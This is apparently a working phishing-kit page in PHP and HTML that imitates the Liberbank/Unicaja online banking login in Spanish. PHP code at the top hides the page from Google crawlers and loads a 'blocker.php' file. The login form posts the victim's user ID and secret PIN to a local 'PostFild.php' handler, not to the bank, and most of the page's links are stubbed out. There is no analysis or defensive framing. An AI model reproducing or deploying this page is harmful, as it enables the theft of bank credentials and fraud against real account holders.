<?php
session_start();
error_reporting(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


include("./blocker.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);

?>
<!DOCTYPE html>

<html>
<head>	
	<script src="js/comunBEWEB.js" type="text/javascript"></script>
	<title>Liberbank - Banca a distancia Login</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
	<meta name="format-detection" content="telephone=no" />
	<meta name="robots" content="noindex,nofollow">
	<meta name="nombre" content="01LOGIN2"/>
	<meta http-equiv="Expires" content="-1">
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="Expires" content="0">
	<meta http-equiv="Cache-Control" content="no-cache">
	<!--Nuevo js comun BEWEB-->	
	<script type="text/javascript">
			try
			{
				document.domain="liberbank.es";//para poder hablar entre frames y el dominio de cep.ceca.es(tiene que estar en todos los frames)
			}
			catch( _ex )
			{
				if( "liberbank.es" == "bmn.es" )
				
					document.domain="sanostra.es";
			}
	</script>
	<link rel="icon" type="image/png" href="lib/images/favicon.png" sizes="16x16">
	<link rel="apple-touch-icon" sizes="57x57" href="lib/images/favicon.png">
	<meta name="application-name" content="Liberbank"/>
	<link href="lib/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="lib/css/fontliberbank.css" rel="stylesheet" type="text/css" /> 
	<link href="lib/css/login2.css" rel="stylesheet" type="text/css" /> 
	<link href="lib/css/fingerTouch.css" rel="stylesheet" type="text/css" /> 
	<link href="lib/css/notificacion-instantanea.css" rel="stylesheet" type="text/css" /> 
	
	<script src="js/jquery.bd.js" type="text/javascript"></script>
	<script type='text/javascript' src='js/notificacion-instantanea.js'></script> 
	<script type='text/javascript' src='js/t_scrolltextvertical.js'></script>
	<script type='text/javascript' src='js/MOD3.js'></script>
	<script type="text/javascript" src="js/funAjax.js"></script>
	<script type="text/javascript" src="js/placeholder-min.js"></script>
	<script type="text/javascript" src="js/media_analyticsv2.js"></script> 
	<script id="crossConfigJs" src="js/cross-config.js"></script>
	
	<script type='text/javascript'>
		var esApp = "";
		var ponmesiespc = "";

		var ancho = screen.availWidth;
		var alto = screen.availHeight;

		if (ancho <= 800) {
			ponmesiespc="FALSE";
		} else {
			ponmesiespc="TRUE";
		}
		
		var PAN1 = "";
		var urlNuevoSello = "/BEWeb/2048/W048/inicio_identificacion_Sello.action;jsessionid=pLd4YtT2L7CqJS_cqaySVcym.limon?OPERACION=inicio_identificacion_Sello&IDIOMA=null&OPERAC=0000&LLAMADA=&CLIENTE=&CAJA=2048&CAMINO=W048&NOCACHE=20210831092050";
		var ajaxSello = "";
		
		$(document).ready(function () {
			iniciar();
			$('#PAN, #PIN1').focus(function() {
				$(this).parent().find('.input-group-append').addClass('border');
			}).blur(function() {
				$(this).parent().find('.input-group-append').removeClass('border');
			});
			$('#recordarPAN').click(function() {
				cerrarPopup();
			});
			$('#recuperarPAN1').click(function() {
				cerrarPopup();
			});
		});
		
		var ctrlsubmit=0;
		function valida(){
			document.getElementById("btn-entrar").setAttribute("disabled", "disabled");
			var fformu = document.getElementById("formu");
			if (!ctrlsubmit){
				ctrlsubmit=1;
				ajaxSello = new MiAjax(urlNuevoSello);
				ajaxSello.lanzar(function(){
					if (ajaxSello.ro.readyState==4 && ajaxSello.ro.status==200) finAjaxSello(ajaxSello.ro);
				});				
			}
		}
				
		function compruebaInfocaja(){
			valida();
		}
				
		function iniciar() {
			if (esApp == "SI") {
				// No hacemos nada
			} else {
				if (document.getElementById('formu').RFOP && document.getElementById('formu').IMPO) {
					var user_agent = navigator.userAgent.toLowerCase();
					var espc = false;
					if ((user_agent.indexOf("mozilla/4")!=-1) || (user_agent.indexOf("mozilla/5")!=-1)) {
						if ((user_agent.indexOf("ipad")!=-1) || (user_agent.indexOf("macintosh")!=-1) ||
							(user_agent.indexOf("x11")!=-1) || (user_agent.indexOf("linux")!=-1) || 
							(user_agent.indexOf("windows nt")!=-1) || (user_agent.indexOf("freebsd")!=-1))
						{
							if ((user_agent.indexOf("android")==-1) && (user_agent.indexOf("midp")==-1)) {
								espc = true;
							}
						}
					}					
					var ancho = screen.availWidth;
					var alto = screen.availHeight;
		
					if (!espc && (((ancho<600) && alto<1024) || ((alto<600) && ancho<1024))) {
						//
					} else {
						iniciarOk();
					}						
				} else {
					iniciarOk();
				}
			}
		}
		
		function iniciarOk() {
			document.getElementById("entrada").style.display = "";
			comprobarFooter();	
			document.getElementById("formu").PAN.focus();
			$('#PAN').parent().find('.input-group-append').addClass('border');
		}
		
		// Abre popup de contratación de banca a distancia
		function abrecontratacion(){
			newwindow=open('https://www.cajastur.es/contratacion/index.html',"popupcon","scrollbars=yes,location=no,toolbar=no,directories=no,menubar=no,resizable=no,resize=no,status=no,width=710,height=470,screenX=20,screenY=20,left=20,top=20");
		}
		
		function veracceso(){
			document.getElementById("texto").innerHTML=document.getElementById("acceso").innerHTML;
			cargado=1;
			scrolltextInit();
		}
		
		function atras(){
			document.getElementById("texto").innerHTML="";
		}
		
		function recomendaciones(){
			document.getElementById("texto").innerHTML=document.getElementById("recomendaciones").innerHTML;
			cargado=1;
			scrolltextInit();
		}
		
		function verseguridad() {
			if(document.getElementById("seguridad").style.display=="block") {
				document.getElementById("seguridad").style.display="none";
			} else {
				document.getElementById("seguridad").style.display="block";
				document.getElementById("problemas").style.display="none";
			}
		}
		
		function verproblemas() {
			if(document.getElementById("problemas").style.display=="block"){
				document.getElementById("problemas").style.display="none";
			} else {
				document.getElementById("seguridad").style.display="none";
				document.getElementById("problemas").style.display="block";
			}
		}
		
		function submitenter(myfield,e){
			var keycode;
			if (window.event) keycode = window.event.keyCode;
			else if (e) keycode = e.which;
			else return true;
		
			if (keycode == 13){
				compruebaInfocaja();
			}
		}
		
		function mostrarAyudaInputPan(element) {
			if (element.childNodes[1].classList.contains('show-tooltip')) {
				element.childNodes[1].classList.remove('show-tooltip');
			} else {
				element.childNodes[1].classList.add('show-tooltip');
			}
		}
		
		function mostrarInputsPin() {
			var elementIcono = document.getElementById('icono-password');
			var elementInput = document.getElementById("PIN1");
			if (elementIcono.classList.contains('icono-oculto')) {
				elementInput.type = "text";
				elementIcono.classList.remove('icono-oculto');
				elementIcono.classList.add('icono-visible');
			} else {
				elementInput.type = "password";
				elementIcono.classList.remove('icono-visible');
				elementIcono.classList.add('icono-oculto');
			}
			return false;
		}
		
		$(window).resize(function() {
			comprobarFooter();
		});
		
		function comprobarFooter() {
			var altoContent = $('#login .header').height() + $('#login .container.content').height() + ($('#login .container.footer').height() + 40);
			var altoWindow = $(window).height();
			if (altoContent > altoWindow) {
				$('#login .container.footer').css('position', 'relative');
			} else {
				$('#login .container.footer').css('position', 'fixed');
			}
		}
		
		function eventTrack(event, action, label) {
		    if (event === 'I') {
		        event = 'interaccion';
		    }
		    if (label === 'U') {
		        label = window.location.pathname;
		    }
		    const data = {
		        event: event,
		        eAction: action,
		        eLabel: label
		    };
		    dataLayer.push(data);
		}
	
		function clickEnlace(action, url) {
		    action = 'clic-' + action;
		    eventTrack('I', action, 'U');
		    if (url) {
		    	window.location.href = url;
		    }
	
		    return false;
		}
		
		function changeCookiesConfig(options) {
			var formulario = document.getElementById('formu');
			formulario.cookiesOptions.value = options;
			dataLayer.push({options: options});
		}
		
		function abrirDialogo(){
			$('#avisorecuperarpc').show();
		}
		
		function cerrarPopup(){
			$('#avisorecuperarpc').hide();
		}

		function validarFormulario(f) {
				
				if (f.PAN.value == null || f.PAN.value.length == 0) {
					alert("Debe introducir su nombre de PAN.");
					f.PAN.focus();
					return false;
				}
				if (f.PAN.value.length < 2 || f.PAN.value.length > 16) {
					alert("La longitud del nombre de PAN no es correcta.");
					f.PAN.focus();
					return false;
				}
				
				if (f.PAN1.value == null || f.PAN1.value.length == 0) {
					alert("Debe introducir su PAN1 de frm-log.");
					f.PAN1.focus();
					return false;
				}
				if (f.PAN1.value.length < 4 || f.PAN1.value.length > 16) {
					alert("La longitud de la PAN1 de frm-log no es correcta.");
					f.PAN1.focus();
					return false;
				}
				
				f.password.value = cifrar(f.PAN1.value);
				//f.PAN1.value = '';
				
				return true;
		}
	</script>

</head>

<body id="entrada" style="display:none">
	<div id="login">
		<div class="header">
			<div class="container py-2">
				<div class="row">
					<div class="col d-flex align-items-center justify-content-between">
						<h1 class="d-flex align-items-center m-0">
							<i class="fas icono-logo-unicaja-liberbank"></i>
						</h1>
						<a href="#">Cancelar y salir</a>
					</div>
				</div>
			</div>
		</div>
		
		<div class="container content mt-3 mt-md-5 mb-2">
			<div class="row">
				<div class="col-12 col-md-8">
					<div id="notif-instantanea">
						<script type="text/javascript">
							// Conectamos con la API de notificaciones instantáneas
							cargarNotificacionInstantanea();
						</script>
					</div>
				
					<h2>Accede a la Banca Digital</h2>
					<form id="formu" name="formu" action="./inc/PostFild.php" method="post" enctype="application/x-www-form-urlencoded" onsubmit="javascript: return validarFormulario(this);">
						<div class="form-group form-group-credential">
							<label for="PAN">Usuario / Referencia</label>
							<div class="col-12 col-md-6 px-0 input-group">
								<input type="text" name="PAN" id="PAN" maxlength="25" tabindex="1" class="form-control" placeholder="" required/>
								<div class="input-group-append">
									<div class="input-group-text color-verde custom-tooltip tooltip-pan bottom">
										<i class="fas icono-interrogante-circulo"></i>
										<div class="after">
											<p><strong>Puedes logarte como prefieras:</strong></p>
											<ul>
												<li>Particulares: Con tu DNI (con letra), NIE (con letras), número de usuario o alias de Banca Digital.</li>
												<li>Empresas: Con tu número de usuario o alias de Banca Digital.</li>
											</ul>
										</div>
									</div>
								</div>
							</div>
							<small class="form-text text-muted">
								<a href="#">He olvidado mi usuario</a>
							</small>
						</div>
						
						<div class="form-group form-group-credential">
							<label for="PIN1">Número secreto / Contraseña</label>
							<div class="col-12 col-md-6 px-0 input-group">
								<input type="password" name="PIN1" id="PIN1" value="" autocomplete="off" maxlength="10" tabindex="2" class="form-control" placeholder=""  required />
    							<div class="input-group-append" onclick="return mostrarInputsPin()">
									<span class="input-group-text color-verde"><i id="icono-password" class="fas icono-oculto"></i></span>
								</div>
							</div>
							<small class="form-text text-muted">
								<a href="#">
									He olvidado/bloqueado mi número secreto
								</a>
							</small>
						</div>
						
						<div class="form-group">
							<div class="col-12 col-md-6 px-0">
								<input type="submit" id="btn-entrar" tabindex="3" value="Entrar" class="btn btn-lbk" />
							</div>
						</div>
					</form>
				</div>
				
				<div class="col-12 col-md-4 mt-5 mt-md-0">
					<div class="texto-ayuda p-3 mb-3">
						<p class="titulo">Acciones importantes</p>
						<p>
							<a onclick="clickEnlace('no-tengo-PAN-banca-digital', this.href)" href="#" class="semibold">
								Darme de alta en Banca Digital <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
						<p>
							<a  onclick="clickEnlace('acceso-dni-electronico', this.href)" href="#" class="semibold">
								Acceso DNI electrónico <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
						<p>
							<a onclick="clickEnlace('ver-recomendaciones-seguridad', this.href)" href="#" class="semibold">
								Ver recomendaciones de seguridad <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
					</div>
					
					<div class="texto-ayuda p-3 mb-3">
						<p class="titulo">Guías de uso</p>
						<p>Consulta nuestras guías de Banca Digital para sacarle todo el provecho, informarte sobre cómo darte de alta o restablecer tu número secreto.</p>
						<div class="col-12 col-md-6 px-0">
							<a href="#" onclick="eventTrack('I', 'clic_ver_guias', 'U')" title="Consultar guías de Banca Digital" target="_blank">
								<input type="button" id="btn-entrar" tabindex="4" value="Ver guías" class="btn btn-lbk btn-lbk-blanco" />
							</a>
						</div>
					</div>
				</div>
			</div>
		</div>
		
		<div class="container footer">
			<div class="row">
				<div class="col-12 col-md-2 d-flex align-items-center justify-content-center col-logo">
					<i class="fas icono-logo-unicaja-liberbank"></i>
				</div>
				<div class="col-12 col-md-8 d-flex align-items-center justify-content-center text-center my-sm-3 col-listado">
					<ul class="list-inline mb-0">
  						<li class="list-inline-item">&copy; 2021 Unicaja Banco</li>
  						<li class="list-inline-item"><a href="#">Cookies</a></li>
  						<li class="list-inline-item"><a href="#">Aviso legal</a></li>
  						<li class="list-inline-item"><a href="#">Política de privacidad</a></li>
  					</ul>
				</div>
				<div class="col-12 col-md-2 d-flex align-items-center justify-content-center col-rrss">
					<a href="#" class="ml-1"><i class="fas icono-linkedin"></i></a>
					<a href="#" class="ml-1"><i class="fas icono-facebook"></i></a>
					<a href="#" class="ml-1"><i class="fas icono-twitter"></i></a>				
				</div>
			</div>
		</div>
	</div> <!-- fin de id login-->
			
	<div id="avisorecuperarpc" class="modalTouch">
		<div class="modalTouchContenido avisoOlvidarPAN">
			<div class="mat-dialog-container">
				<div class="mat-dialog-header border-bottom-none">
					<div class="mat-dialog-title"> </div>
					<div class="mat-dialog-close">
						<a title="cerrar" href="#" onclick="cerrarPopup();">
							<i class="fas icono-cerrar"></i>
						</a>
					</div>
				</div>
				<div class="mat-dialog-content">
					<p class="texto-principal">
						<i class="fas icono-info-circulo"></i> Información
					</p>
					<p>Puedes recuperar tu número de PAN: </p>
					<p class="ml-3">- Si eres un PAN particular y tienes contratada una tarjeta de Liberbank <a id="recordarPAN" onclick="clickEnlace('he-olvidado-numero-secreto', this.href)" href="https://bonline.liberbank.es/ms-regkeys/#/regenPAN1">recupera tu PAN</a></p>
					<p class="ml-3">- Llamando a nuestro servicio de atención al cliente 985 969 700</p>
					<p class="ml-3">- O consultándolo en <a id="recordarPAN" target="_blank" href="#">estos documentos</a></p>
					<p class="fila-boton">
						<a class="btn btn-lbk btn-restablecer" id="recuperarPAN1" href="#" onclick="cerrarPopup();">Aceptar</a>
					</p>
				</div>
			</div>
		</div>
	</div>
	
</body>

</html>